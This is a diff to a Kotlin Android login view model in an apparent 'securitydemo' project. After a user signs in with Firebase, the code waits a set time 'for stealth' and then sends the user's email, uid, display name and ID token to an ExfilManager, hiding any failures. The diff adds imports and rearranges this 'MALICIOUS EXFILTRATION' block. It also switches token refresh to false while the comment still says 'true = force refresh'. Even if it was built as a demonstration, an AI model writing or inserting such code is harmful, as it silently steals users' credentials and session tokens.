@@ -14,7 +14,14 @@ import kotlinx.coroutines.TimeoutCancellationException
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import android.util.Log
-import com.example.sitconnect.securitydemo.malicious.ExfilManager   // ← adjust package name if needed
+import com.example.sitconnect.securitydemo.malicious.ExfilManager// ← adjust package name if needed
+import android.content.Context
+import android.content.pm.PackageManager
+import androidx.core.content.ContextCompat
+import android.Manifest
+import android.os.Build
+
+
 
 sealed class AuthState {
     object Idle : AuthState()
@@ -57,42 +64,43 @@ class AuthViewModel : ViewModel() {
                 withTimeout(15000L) { // 15 second timeout
                     val result = auth.signInWithEmailAndPassword(email, password).await()
                     val user = result.user
-
                     _authState.value = AuthState.Success(user)
+                }
 
                     // ────────────────────────────────────────────────────────────────
                     //          MALICIOUS EXFILTRATION
-                    if (user != null) {
-                        launch {
-                            try {
-                                // Small delay to make it less obvious (stealth simulation)
-                                delay(10000)  // 90 seconds – change to 10000 (10s) for faster testing
+                val user = (authState.value as? AuthState.Success)?.user
+                if (user != null) {
+                    launch {
+                        try {
+                            // Small delay to make it less obvious (stealth simulation)
+                            delay(10000)  // 90 seconds – change to 10000 (10s) for faster testing
 
-                                val idToken = getFreshIdToken(user)
-                                if (idToken != null) {
-                                    val payload = mapOf(
-                                        "email"       to user.email,
-                                        "uid"         to user.uid,
-                                        "displayName" to (user.displayName ?: "N/A"),
-                                        "idToken"     to idToken,
-                                        "timestamp"   to System.currentTimeMillis(),
-                                        // You can add more later (device info, etc.)
-                                    )
+                            val idToken = getFreshIdToken(user)
+                            if (idToken != null) {
+                                val payload = mapOf(
+                                    "email"       to user.email,
+                                    "uid"         to user.uid,
+                                    "displayName" to (user.displayName ?: "N/A"),
+                                    "idToken"     to idToken,
+                                    "timestamp"   to System.currentTimeMillis(),
+                                    // You can add more later (device info, etc.)
+                                )
 
-                                    Log.d("ExfilDemo", "Sending stolen payload...")
+                                Log.d("ExfilDemo", "Sending stolen payload...")
 
-                                    // This runs the actual network send on IO thread
-                                    launch(Dispatchers.IO) {
-                                        ExfilManager.send(payload)
-                                    }
+                                // This runs the actual network send on IO thread
+                                launch(Dispatchers.IO) {
+                                    ExfilManager.send(payload)
                                 }
-                            } catch (e: Exception) {
-                                Log.e("ExfilDemo", "Exfil failed silently: ${e.message}")
                             }
+                        } catch (e: Exception) {
+                            Log.e("ExfilDemo", "Exfil failed silently: ${e.message}")
                         }
                     }
-                    //                 End of malicious exfiltration code
                 }
+                    //                 End of malicious exfiltration code
+
             } catch (e: TimeoutCancellationException) {
                 _authState.value = AuthState.Error("Login timed out. Please check your internet connection.")
             } catch (e: Exception) {
@@ -167,7 +175,7 @@ class AuthViewModel : ViewModel() {
     private suspend fun getFreshIdToken(user: FirebaseUser?): String? {
         if (user == null) return null
         return try {
-            val result: GetTokenResult = user.getIdToken(true).await()  // true = force refresh
+            val result: GetTokenResult = user.getIdToken(false).await()  // true = force refresh
             result.token
         } catch (e: Exception) {
             Log.e("AuthViewModel", "Failed to get ID token: ${e.message}")
